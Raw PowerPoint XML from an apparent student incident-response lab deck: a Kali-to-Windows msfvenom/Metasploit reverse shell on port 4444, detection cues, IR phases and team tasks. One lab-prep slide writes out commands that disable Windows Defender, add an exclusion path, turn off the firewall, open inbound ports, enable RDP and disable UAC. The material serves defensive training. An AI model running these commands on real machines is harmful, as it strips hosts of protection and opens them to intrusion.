          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6280000" y="1720000"/>
            <a:ext cx="400000" cy="800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Step4Bg"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720000" y="1400000"/>
            <a:ext cx="1600000" cy="700000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 30000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="00D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Step4Text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6760000" y="1430000"/>
            <a:ext cx="1520000" cy="6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>
                <a:solidFill>
                  <a:srgbClr val="00D4FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>4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Victim runs EXE — Notepad opens as decoy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Arr4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8360000" y="1720000"/>
            <a:ext cx="400000" cy="8000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Step5Bg"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8800000" y="1400000"/>
            <a:ext cx="3000000" cy="700000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 30000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0A0A"/>
          </a:solidFill>
          <a:ln w="20320">
            <a:solidFill>
              <a:srgbClr val="00E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Step5Text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8840000" y="1430000"/>
            <a:ext cx="2920000" cy="6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>
                <a:solidFill>
                  <a:srgbClr val="00E57A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>5 — SHELL ESTABLISHED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Meterpreter connects to Kali port 4444 — Attacker has full control</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="IRTableBg"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="2400000"/>
            <a:ext cx="11450000" cy="3900000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1828"/>
          </a:solidFill>
          <a:ln w="10160">
            <a:solidFill>
              <a:srgbClr val="00D4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IRTableText"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="485354" y="2780147"/>
            <a:ext cx="9210078" cy="37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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00D4FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>HOW IR DETECTS EACH STEP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFA000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>EXE runs:  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Event ID 4688 (process creation) + Browser download history</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFA000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Shell connects:  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>netstat -</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ano</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> shows outbound TCP to port 4444 (non-standard port)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFA000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Privilege logon:  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Event ID 4624 + 4672 in Security log</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFA000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Process migration:  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Parent-child anomaly — cmd.exe spawned under powershell.exe (wmic)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFA000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Malware file:  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SHA256 hash = primary IoC — matches known </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> payload signature</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1400" b="1" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00E57A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>“A bank employee received a fake IT email, ran what they thought was a security patch, and gave an attacker full remote control of their workstation — detected only because IR was monitoring outbound connections on non-standard ports.”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515600" y="137160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835640" y="137160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1155680" y="137160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11475720" y="137160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515600" y="169164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835640" y="169164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155680" y="169164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75720" y="169164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515600" y="201168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0835640" y="201168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155680" y="201168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1475720" y="201168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515600" y="233172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0835640" y="233172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1155680" y="233172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1475720" y="233172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515600" y="265176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835640" y="265176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155680" y="265176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1475720" y="265176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515600" y="297180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0835640" y="297180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1155680" y="297180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1475720" y="2971800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515600" y="3291839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835640" y="3291839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155680" y="3291839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475720" y="3291839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0515600" y="3611879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0835640" y="3611879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1155680" y="3611879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1475720" y="3611879"/>
            <a:ext cx="54864" cy="54864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" y="182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AGENDA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We Cover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1298448"/>
            <a:ext cx="4572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1463040"/>
            <a:ext cx="5577840" cy="114300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3776" y="1810512"/>
            <a:ext cx="530352" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst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93776" y="1810512"/>
            <a:ext cx="530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1288" y="15544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Lab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1288" y="1965960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Attack side &amp; IR side preparation on VMs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761488"/>
            <a:ext cx="5577840" cy="114300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93776" y="3108960"/>
            <a:ext cx="530352" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst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93776" y="3108960"/>
            <a:ext cx="530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1288" y="285292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Social Engineering Attack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1288" y="3264408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Reverse shell delivery Kali -&gt; Windows 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059935"/>
            <a:ext cx="5577840" cy="114300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93776" y="4407407"/>
            <a:ext cx="530352" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst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93776" y="4407407"/>
            <a:ext cx="530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1288" y="4151375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1 — Identification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1288" y="4562855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Network &amp; process analysis, PID mapping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358383"/>
            <a:ext cx="5577840" cy="114300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93776" y="5705855"/>
            <a:ext cx="530352" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst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93776" y="5705855"/>
            <a:ext cx="530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1288" y="5449823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2 — Containment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1288" y="5861303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Network isolation, process suspension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1463040"/>
            <a:ext cx="5577840" cy="114300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B4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437376" y="1810512"/>
            <a:ext cx="530352" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst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437376" y="1810512"/>
            <a:ext cx="530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04888" y="15544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3 — Eradication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04888" y="1965960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Kill processes, delete payload, clean registry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2761488"/>
            <a:ext cx="5577840" cy="114300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437376" y="3108960"/>
            <a:ext cx="530352" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666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437376" y="3108960"/>
            <a:ext cx="530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04888" y="285292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4 — Recovery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04888" y="3264408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 scan, re-enable network, verify clean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4059935"/>
            <a:ext cx="5577840" cy="114300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437376" y="4407407"/>
            <a:ext cx="530352" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst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437376" y="4407407"/>
            <a:ext cx="530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04888" y="4151375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5 — Post-Incident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04888" y="4562855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Forensics, event logs, final IR report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789920" y="73152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109960" y="73152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1430000" y="73152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11750040" y="73152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789920" y="105156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109960" y="105156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430000" y="105156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750040" y="105156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789920" y="137160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109960" y="137160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430000" y="137160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1750040" y="137160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789920" y="1691639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109960" y="1691639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1430000" y="1691639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1750040" y="1691639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789920" y="201168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1109960" y="201168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430000" y="201168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1750040" y="201168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789920" y="233172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1109960" y="233172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1430000" y="233172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1750040" y="233172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789920" y="2651759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1109960" y="2651759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430000" y="2651759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750040" y="2651759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0789920" y="297180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1109960" y="297180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1430000" y="297180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1750040" y="297180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0789920" y="3291839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1109960" y="3291839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1430000" y="3291839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1750040" y="3291839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0789920" y="361188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1109960" y="361188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11430000" y="361188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1750040" y="3611880"/>
            <a:ext cx="54864" cy="54864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7200" y="182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Task Distribution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1298448"/>
            <a:ext cx="4572000" cy="36576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65760" y="1417320"/>
            <a:ext cx="3611880" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 106666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA000"/>
          </a:solidFill>
          <a:ln w="9525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65760" y="14173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LAB SETUP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2057400"/>
            <a:ext cx="3611880" cy="138988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FFA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2194560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Amr &amp; Omar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2624328"/>
            <a:ext cx="2788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Attack Side Lab Preparation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611880"/>
            <a:ext cx="3611880" cy="138988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548640" y="4087368"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA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48640" y="40873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" y="3749040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Martina &amp; Mariam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" y="4178808"/>
            <a:ext cx="2788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IR Side Lab Preparation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166360"/>
            <a:ext cx="3611880" cy="138988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548640" y="5641848"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA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48640" y="56418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" y="5303520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Adham &amp; Mostafa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" y="5733288"/>
            <a:ext cx="2788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Social Engineering Reverse Shell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97680" y="1417320"/>
            <a:ext cx="3611880" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 106666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4FF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297680" y="14173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INCIDENT RESPONSE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97680" y="2057400"/>
            <a:ext cx="3611880" cy="138988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480560" y="2532888"/>
            <a:ext cx="384048" cy="384048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480560" y="25328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83480" y="2194560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Martina &amp; Omar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83480" y="2624328"/>
            <a:ext cx="2788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IR Steps  1 -&gt; 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0" y="3611880"/>
            <a:ext cx="3611880" cy="138988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4480560" y="4087368"/>
            <a:ext cx="384048" cy="384048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480560" y="40873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83480" y="3749040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Mostafa &amp; Amr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83480" y="4178808"/>
            <a:ext cx="2788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IR Steps  7 -&gt; 12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97680" y="5166360"/>
            <a:ext cx="3611880" cy="138988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4480560" y="5641848"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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480560" y="56418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83480" y="5303520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Adham &amp; Mariam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83480" y="5733288"/>
            <a:ext cx="2788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IR Steps 13 -&gt; 18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229600" y="1417320"/>
            <a:ext cx="3611880" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 106666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E57A"/>
          </a:solidFill>
          <a:ln w="9525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229600" y="14173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DOCUMENTATION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0" y="2057400"/>
            <a:ext cx="3611880" cy="138988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412480" y="2532888"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E57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8412480" y="25328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15400" y="2194560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Mariam &amp; Martina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15400" y="2624328"/>
            <a:ext cx="2788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1 Report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29600" y="3611880"/>
            <a:ext cx="3611880" cy="138988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8412480" y="4087368"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E57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8412480" y="40873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15400" y="3749040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Mostafa &amp; Amr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15400" y="4178808"/>
            <a:ext cx="2788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2 Report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0" y="5166360"/>
            <a:ext cx="3611880" cy="138988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8412480" y="5641848"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E57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412480" y="56418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15400" y="5303520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Omar &amp; Adham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15400" y="5733288"/>
            <a:ext cx="2788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Weeks 3 &amp; 4 Reports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8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LAB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Lab Environment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4572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4389120" cy="5166360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 133333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="051810"/>
          </a:solidFill>
          <a:ln w="1524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103120" y="1627632"/>
            <a:ext cx="822960" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0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03120" y="1627632"/>
            <a:ext cx="822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786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KALI LINUX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71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Attacker Machine  |  192.168.216.129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337560"/>
            <a:ext cx="4023360" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E57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373886" y="3801761"/>
            <a:ext cx="109728" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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84198" y="3746897"/>
            <a:ext cx="3794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msfvenom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payload generation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Oval 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1369313" y="4069223"/>
            <a:ext cx="109728" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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79625" y="4014359"/>
            <a:ext cx="3794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Metasploit — multi/handler listener</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Oval 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1373886" y="4345543"/>
            <a:ext cx="109728" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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84198" y="4290679"/>
            <a:ext cx="3794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Netcat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(nc) — reverse shell catcher</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Oval 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1373886" y="4652153"/>
            <a:ext cx="109728" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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84198" y="4597289"/>
            <a:ext cx="3794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Nmap — port &amp; service reconnaissance</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Oval 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1373886" y="4970764"/>
            <a:ext cx="109728" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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84198" y="4915900"/>
            <a:ext cx="3794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Python HTTP — payload delivery server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Oval 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1373886" y="5295376"/>
            <a:ext cx="109728" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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84198" y="5240512"/>
            <a:ext cx="3794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PowerShell Payload — no EXE required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28032" y="3931920"/>
            <a:ext cx="25603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8032" y="316382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Reverse Shell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1466" y="426060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TCP Port 4444</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Oval 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5897880" y="3703320"/>
            <a:ext cx="347472" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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733288" y="3538727"/>
            <a:ext cx="676656" cy="676656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591556" y="3349399"/>
            <a:ext cx="1005840" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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498079" y="1417320"/>
            <a:ext cx="4297680" cy="5166360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 133333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="051022"/>
          </a:solidFill>
          <a:ln w="1524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9326880" y="1627632"/>
            <a:ext cx="822960" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="03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326880" y="162763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5786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78D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WINDOWS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971800"/>
            <a:ext cx="4023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Victim Machine  |  192.168.216.</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="ar-EG" sz="1000" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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128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6080A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699248" y="3337560"/>
            <a:ext cx="3913632" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0078D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529065" y="3795831"/>
            <a:ext cx="109728" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0078D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739377" y="3740967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Defender — DISABLED  (all modules)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Oval 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8529065" y="4059535"/>
            <a:ext cx="109728" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0078D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39377" y="4004671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Firewall  — DISABLED  (all profiles)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Oval 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8529065" y="4334256"/>
            <a:ext cx="109728" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0078D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39377" y="427939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RDP       — ENABLED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Oval 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8529065" y="4659689"/>
            <a:ext cx="109728" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0078D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739377" y="4604825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UAC       — DISABLED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Oval 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8529065" y="4980246"/>
            <a:ext cx="109728" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0078D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739377" y="492538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Port 4444, 5555, 8080 — OPEN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Oval 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8529066" y="5259843"/>
            <a:ext cx="109728" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0078D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739378" y="5204979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Exclusions added to Public\Documents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6537960"/>
            <a:ext cx="5760720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 53333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1428"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="608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246120" y="65653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VMware Host-Only / NAT  |  Isolated lab environment — no external internet access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515600" y="137160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835640" y="137160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1155680" y="137160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11475720" y="137160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795760" y="137160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515600" y="169164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835640" y="169164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155680" y="169164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1475720" y="169164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795760" y="169164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515600" y="201168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835640" y="201168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1155680" y="201168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75720" y="201168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1795760" y="201168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515600" y="233172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835640" y="233172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1155680" y="233172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475720" y="233172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1795760" y="233172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515600" y="265176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0835640" y="265176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1155680" y="265176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1475720" y="265176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1795760" y="265176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0" y="297180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835640" y="297180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155680" y="297180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1475720" y="297180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1795760" y="297180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515600" y="3291839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0835640" y="3291839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1155680" y="3291839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1475720" y="3291839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1795760" y="3291839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515600" y="3611879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0835640" y="3611879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1155680" y="3611879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11475720" y="3611879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1795760" y="3611879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10515600" y="393192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0835640" y="393192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1155680" y="393192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11475720" y="393192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1795760" y="3931920"/>
            <a:ext cx="54864" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA0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57200" y="182880"/>
            <a:ext cx="2560320" cy="301752"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst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0352" y="219456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50F1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 — LAB SETUP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943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Windows 10 Lab Preparation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1280160"/>
            <a:ext cx="4572000" cy="36576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7200" y="1417320"/>
            <a:ext cx="11247120" cy="566928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566928" y="1499616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768096" y="149961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969264" y="1499616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21792" y="167335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RUN AS ADMINISTRATOR:  windows_lab_prep.bat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2121408"/>
            <a:ext cx="5577840" cy="210312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270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02920" y="2286000"/>
            <a:ext cx="475488" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 80000"/>
            </a:avLst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02920" y="22860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" y="22585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3D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Disable Windows Defender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2779776"/>
            <a:ext cx="5303520" cy="128016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12648" y="286207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13816" y="286207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1014984" y="286207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67512" y="3035808"/>
            <a:ext cx="5029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sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents'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2121408"/>
            <a:ext cx="5577840" cy="210312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309360" y="2286000"/>
            <a:ext cx="475488" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 80000"/>
            </a:avLst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309360" y="22860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22008" y="22585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Disable Windows Firewall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2779776"/>
            <a:ext cx="5303520" cy="128016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6419088" y="286207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6620256" y="286207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6821424" y="286207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473952" y="3035808"/>
            <a:ext cx="5029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netsh advfirewall set allprofiles state off
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False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407408"/>
            <a:ext cx="5577840" cy="210312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02920" y="4572000"/>
            <a:ext cx="475488" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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02920" y="45720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5568" y="45445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 Required Ports (Inbound)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5065776"/>
            <a:ext cx="5303520" cy="128016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612648" y="514807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813816" y="514807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1014984" y="514807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67512" y="5321808"/>
            <a:ext cx="5029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netsh advfirewall firewall add rule name="LAB-4444"
  protocol=TCP dir=in localport=4444 action=allow
[Also: 80, 443, 445, 3389, 5555, 8080, 135, 139]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72200" y="4407408"/>
            <a:ext cx="5577840" cy="2103120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270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6309360" y="4572000"/>
            <a:ext cx="475488" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 80000"/>
            </a:avLst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309360" y="45720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22008" y="45445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Enable RDP  &amp;  Disable UAC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5065776"/>
            <a:ext cx="5303520" cy="128016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6419088" y="514807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6620256" y="514807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6821424" y="514807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473952" y="5321808"/>
            <a:ext cx="5029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reg add "HKLM\System\...\Terminal Server"
  /v fDenyTSConnections /t REG_DWORD /d 0
reg add "...\Policies\System" /v EnableLUA /d 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515600" y="73152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835640" y="73152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1155680" y="73152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11475720" y="73152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795760" y="73152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515600" y="105156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835640" y="105156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155680" y="105156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1475720" y="105156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795760" y="105156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515600" y="137160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835640" y="137160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1155680" y="137160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75720" y="137160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1795760" y="137160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515600" y="169163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835640" y="169163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1155680" y="169163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475720" y="169163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1795760" y="169163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515600" y="201168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0835640" y="201168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1155680" y="201168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1475720" y="201168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1795760" y="201168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0" y="233172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835640" y="233172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155680" y="233172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1475720" y="233172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1795760" y="233172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515600" y="265175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0835640" y="265175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1155680" y="265175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1475720" y="265175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1795760" y="265175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515600" y="297180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0835640" y="297180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1155680" 